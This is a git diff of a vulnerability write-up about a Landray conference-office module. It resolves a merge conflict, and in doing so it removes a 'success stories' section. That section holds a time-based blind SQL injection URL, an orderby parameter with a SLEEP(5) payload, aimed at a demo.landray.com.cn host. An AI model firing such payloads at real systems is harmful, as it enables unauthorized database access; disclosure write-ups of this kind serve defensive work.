@@ -24,7 +24,8 @@ Solution: filter dangerous characters and use pre-compilation
 
 Conference Office
 
-<<<<<<< HEAD
+
+
 ## POC
 
 ````
@@ -39,16 +40,5 @@ X-Requested-With: XMLHttpRequest
 Accept-Encoding: gzip
 
 ````
-=======
-## **Two** **,** **Success** **Stories** 
-
-
-Vulnerability link :
-
-http://demo.landray.com.cn:80/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=(CASE WHEN (2387=2387) THEN SLEEP( 5) ELSE 2387 END)& ordertype = down&s_ajax =true
-
-
->>>>>>> 2e246176a406b77dd8fa412a3fd88441dfaf1b7c
-
 
 
